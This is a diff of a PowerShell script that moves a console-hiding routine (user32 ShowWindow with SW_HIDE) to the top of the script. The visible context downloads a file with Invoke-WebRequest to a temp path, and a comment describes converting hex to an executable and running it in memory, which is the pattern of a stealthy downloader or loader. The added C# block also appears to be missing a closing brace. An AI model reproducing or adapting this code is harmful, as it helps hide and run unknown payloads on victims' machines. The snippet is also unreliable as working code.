@@ -1,4 +1,33 @@
 # ##############################################################################
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public class ConsoleWindow {
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetConsoleWindow();
+        
+        [DllImport("user32.dll")]
+        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        
+        public const int SW_HIDE = 0;
+        public const int SW_SHOW = 5;
+
+        public static void Hide() {
+            IntPtr hWnd = GetConsoleWindow();
+            ShowWindow(hWnd, SW_HIDE);
+        }
+
+        public static void Show() {
+            IntPtr hWnd = GetConsoleWindow();
+            ShowWindow(hWnd, SW_SHOW);
+        }
+"@
+
+# Hide the console window
+[ConsoleWindow]::Hide()
+
+Start-Sleep -Seconds 1
 
 # Redirect both standard output and error to null
 $null = Start-Transcript -Path "$env:TEMP\Ain1_log.txt" -Append
@@ -65,30 +94,6 @@ Invoke-WebRequest -Uri $url -OutFile $tempPath
 #Write-Host "File downloaded to: $tempPath"
 
 ###############################################################################
-
-Add-Type @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class ConsoleWindow {
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetConsoleWindow();
-        [DllImport("user32.dll")]
-        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        public const int SW_HIDE = 0;
-        public const int SW_SHOW = 5;
-        public static void Hide() {
-            IntPtr hWnd = GetConsoleWindow();
-            ShowWindow(hWnd, SW_HIDE);
-        }
-        public static void Show() {
-            IntPtr hWnd = GetConsoleWindow();
-            ShowWindow(hWnd, SW_SHOW);
-        }
-    }
-"@
-
-# Hide the console window
-[ConsoleWindow]::Hide()
 
 #i open the app byconverting the hex to ek and run in the memory
 
